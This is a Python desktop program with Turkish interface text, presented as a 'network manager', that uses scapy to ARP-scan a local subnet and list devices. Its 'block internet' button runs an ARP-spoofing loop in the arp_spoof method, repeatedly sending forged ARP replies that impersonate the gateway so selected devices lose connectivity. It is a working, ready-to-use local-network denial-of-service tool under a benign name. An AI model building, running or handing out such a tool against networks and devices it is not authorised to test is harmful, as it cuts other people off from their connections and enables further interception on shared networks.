import tkinter as tk
from tkinter import ttk, messagebox
from ttkthemes import ThemedTk  # Modern görünüm için
import scapy.all as scapy
from scapy.layers.l2 import ARP
from threading import Thread
import time
from tkinter import font  # Font eklemek için

# Özel temalar ve renkler
DARK_BG = "#1e1e1e"
DARKER_BG = "#121212"
ACCENT_COLOR = "#00bcd4"
HOVER_COLOR = "#0097a7"
TEXT_COLOR = "#ffffff"

# Modern stil oluşturma
class ModernTheme:
    def __init__(self, root):
        self.style = ttk.Style()
        self.style.theme_use("clam")
        root.configure(bg=DARK_BG)
        self.style.configure("TButton",
                             background=ACCENT_COLOR,
                             foreground=TEXT_COLOR,
                             font=("Roboto", 12, "bold"),  # Fontu buraya ekliyoruz
                             borderwidth=0,
                             padding=6)
        self.style.map("TButton",
                       background=[("active", HOVER_COLOR)])
        self.style.configure("TEntry",
                             fieldbackground=DARKER_BG,
                             foreground=TEXT_COLOR,
                             padding=5,
                             insertcolor=TEXT_COLOR,
                             font=("Roboto", 11))  # Font burada da kullanılıyor
        self.style.configure("Treeview",
                             background=DARK_BG,
                             foreground=TEXT_COLOR,
                             fieldbackground=DARK_BG,
                             borderwidth=0)
        self.style.map("Treeview",
                       background=[("selected", ACCENT_COLOR)],
                       foreground=[("selected", TEXT_COLOR)])

# Ağ tarama fonksiyonu
def scan_network(ip_range):
    devices = []
    answered_list = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range), timeout=1, verbose=False)[0]
    for element in answered_list:
        if element[1].psrc not in [device["ip"] for device in devices]:  # Duplicate kontrolü
            devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
    return devices

# MAC Adres Alma
def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except Exception as e:
        messagebox.showerror("Hata", f"MAC adresi alınamadı ({ip}): {e}")
        return None

# Kullanıcı ağ geçidini otomatik algılayabilir
def detect_gateway():
    try:
        result = scapy.conf.route.route("0.0.0.0")[2]
        return result
    except Exception as e:
        messagebox.showerror("Hata", f"Ağ geçidi algılanamadı: {e}")
        return "192.168.1.1"

# GUI Başlangıç
class NetworkManagerApp(ThemedTk):
    def __init__(self):
        super().__init__(theme="arc")  # Modern bir tema
        self.title("Ağ Yöneticisi")
        self.geometry("680x650")
        self.minsize(680, 500)
        self.configure(bg=DARK_BG)
        self.theme = ModernTheme(self)
        self.devices = []
        self.selected_devices = []
        self.active_threads = []
        self.stop_flag = False
        self.gateway_ip = detect_gateway()  # Otomatik ağ geçidi algılama
        self.create_widgets()
        self.scan_network_background()  # Otomatik tarama başlatılır

        # Sürükleme işlevselliği ekleme
        self.is_dragging = False
        self.offset_x = 0
        self.offset_y = 0
        self.bind("<ButtonPress-1>", self.on_drag_start)
        self.bind("<B1-Motion>", self.on_drag_motion)

        # Pencereyi boyutlandırmayı engelleme
        self.resizable(False, False)  # Boyutlandırmayı engelle

        # Başlık çubuğunu bırakıyoruz
        self.protocol("WM_DELETE_WINDOW", self.on_closing)  # Pencereyi kapatma butonuna tıklayınca yapılacak işlemi belirliyoruz

    def on_drag_start(self, event):
        """Sürükleme başlatma pozisyonunu kaydet."""
        self.is_dragging = True
        self.offset_x = event.x
        self.offset_y = event.y

    def on_drag_motion(self, event):
        """Pencereyi sürüklerken konumunu değiştirir."""
        if self.is_dragging:
            delta_x = event.x - self.offset_x
            delta_y = event.y - self.offset_y
            new_x = self.winfo_x() + delta_x
            new_y = self.winfo_y() + delta_y
            self.geometry(f"+{new_x}+{new_y}")

    def on_closing(self):
        """Pencereyi kapatma işlevini engellemek için."""
        self.destroy()  # Kapanmayı engellemek yerine doğrudan pencereyi kapatıyoruz

    def create_widgets(self):
        self.main_frame = tk.Frame(self, bg=DARK_BG)
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        # Başlık
        title_label = tk.Label(self.main_frame, text="AĞ YÖNETİCİSİ", bg=DARK_BG, fg=ACCENT_COLOR, font=("Roboto", 20, "bold"))  # Font burada
        title_label.pack(pady=(0, 15))

        # IP Giriş Alanı
        self.ip_entry = ttk.Entry(self.main_frame)
        self.ip_entry.insert(0, "192.168.1.0/24")
        self.ip_entry.pack(pady=5)

        # Ağ Tarama Butonu
        scan_button = ttk.Button(self.main_frame, text="🔍 Ağ Taraması Yap", command=self.manual_scan)
        scan_button.pack(pady=10)

        # Cihaz Listesi
        self.device_list = ttk.Treeview(self.main_frame, columns=("IP", "MAC"), show="headings", height=15, selectmode="extended")
        self.device_list.heading("IP", text="IP Adresi")
        self.device_list.heading("MAC", text="MAC Adresi")
        self.device_list.pack(fill="both", expand=True, pady=15)
        self.device_list.bind("<<TreeviewSelect>>", self.on_device_select)

        # Butonlar
        button_frame = tk.Frame(self.main_frame, bg=DARK_BG)
        button_frame.pack(pady=10)

        block_button = ttk.Button(button_frame, text="🔒 İnternet Engelle", command=self.block_internet)
        block_button.grid(row=0, column=0, padx=10)

        stop_button = ttk.Button(button_frame, text="⛔ İşlemi Durdur", command=self.stop_all_threads)
        stop_button.grid(row=0, column=1, padx=10)

        # Durum Çubuğu
        self.status_label = tk.Label(self.main_frame, text="Hazır", bg=DARK_BG, fg=TEXT_COLOR, anchor="w")
        self.status_label.pack(fill="x", padx=10, pady=5)

    def manual_scan(self):
        """Manuel ağ taraması yapar ve listeyi günceller."""
        self.scan_network_update_list()
        messagebox.showinfo("Ağ Tarama", "Manuel ağ taraması tamamlandı!")

    def scan_network_update_list(self):
        """Ağı tarar ve yalnızca yeni cihazları listeye ekler."""
        ip_range = self.ip_entry.get()
        devices = scan_network(ip_range)
        existing_ips = {self.device_list.item(child)["values"][0] for child in self.device_list.get_children()}
        for device in devices:
            if device["ip"] not in existing_ips:
                self.device_list.insert("", "end", values=(device["ip"], device["mac"]))

    def scan_network_background(self):
        """Otomatik ağ taraması için bir iş parçacığı."""
        def background_task():
            while not self.stop_flag:
                self.scan_network_update_list()
                time.sleep(10)  # Her 10 saniyede bir ağ taraması
            print("Otomatik tarama durduruldu.")

        thread = Thread(target=background_task)
        thread.daemon = True
        thread.start()
        self.active_threads.append(thread)

    def on_device_select(self, event):
        selected_items = self.device_list.selection()
        self.selected_devices = [self.device_list.item(item, "values") for item in selected_items]

    def block_internet(self):
        if not self.selected_devices:
            messagebox.showerror("Hata", "En az bir cihaz seçin!")
            return
        if not messagebox.askyesno("Uyarı", "Bu işlem diğer cihazları etkileyebilir. Devam etmek istiyor musunuz?"):
            return
        self.stop_flag = False
        for device in self.selected_devices:
            target_ip = device[0]
            thread = Thread(target=self.arp_spoof, args=(target_ip, self.gateway_ip))
            thread.daemon = True
            thread.start()
            self.active_threads.append(thread)
        messagebox.showinfo("İnternet Engelle", f"{len(self.selected_devices)} cihaz için internet engelleme işlemi başlatıldı!")

    def arp_spoof(self, target_ip, gateway_ip):
        try:
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip)
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            while not self.stop_flag:
                scapy.send(packet, verbose=False)
                time.sleep(1)
        except Exception as e:
            print(f"[-] ARP Spoofing hatası: {e}")

    def stop_all_threads(self):
        self.stop_flag = True
        for thread in self.active_threads:
            if thread.is_alive():
                thread.join(timeout=1)
        self.active_threads.clear()
        messagebox.showinfo("İşlem Durdur", "Tüm işlemler durduruldu!")

if __name__ == "__main__":
    app = NetworkManagerApp()
    app.mainloop()
